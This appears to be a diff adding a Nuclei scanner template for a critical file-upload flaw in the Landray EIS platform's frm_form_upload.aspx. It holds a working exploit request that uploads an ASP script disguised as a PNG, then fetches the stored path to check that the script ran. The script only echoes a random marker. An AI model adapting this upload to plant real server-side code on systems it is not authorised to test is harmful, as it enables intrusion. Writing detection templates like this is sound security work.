@@ -1,0 +1,64 @@
+id: landray-eis-frm-form-upload
+info:
+  name: 蓝凌EIS智慧协同平台 frm_form_upload.aspx 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template targets a file upload vulnerability in the 蓝凌EIS智慧协同平台 via the frm_form_upload.aspx endpoint.
+
+variables:
+  content: "{{rand_text_alphanumeric(32)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/frm/frm_form_upload.aspx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------zbm72vc8hf9uqmb5f6yr"
+      Cookie: "FIOA_IMG_FOLDER=FI"
+    body: |
+      -----------------------------zbm72vc8hf9uqmb5f6yr
+      Content-Disposition: form-data; name="__VIEWSTATE"
+
+      /wEPDwUKMTgyMDI2MjI1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUG5L+d5a2YZGRk0b9dFZuWblLyitK8Fh6njh8H4xA=
+      -----------------------------zbm72vc8hf9uqmb5f6yr
+      Content-Disposition: form-data; name="__EVENTTARGET"
+
+      GB_SAVE
+      -----------------------------zbm72vc8hf9uqmb5f6yr
+      Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+      保存
+      -----------------------------zbm72vc8hf9uqmb5f6yr
+      Content-Disposition: form-data; name="tpfile"; filename="qwe.asp"
+      Content-Type: image/png
+
+      <% Response.Write("{{content}}") %>
+      -----------------------------zbm72vc8hf9uqmb5f6yr--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'updateOpenerImg')"
+    extractors:
+      - type: regex
+        name: t1
+        internal: true
+        part: body
+        regex:
+          - "updateOpenerImg\\(\\'(?P<t1>.*?)\\'\\);"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/frm/{{t1}}"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, content)"
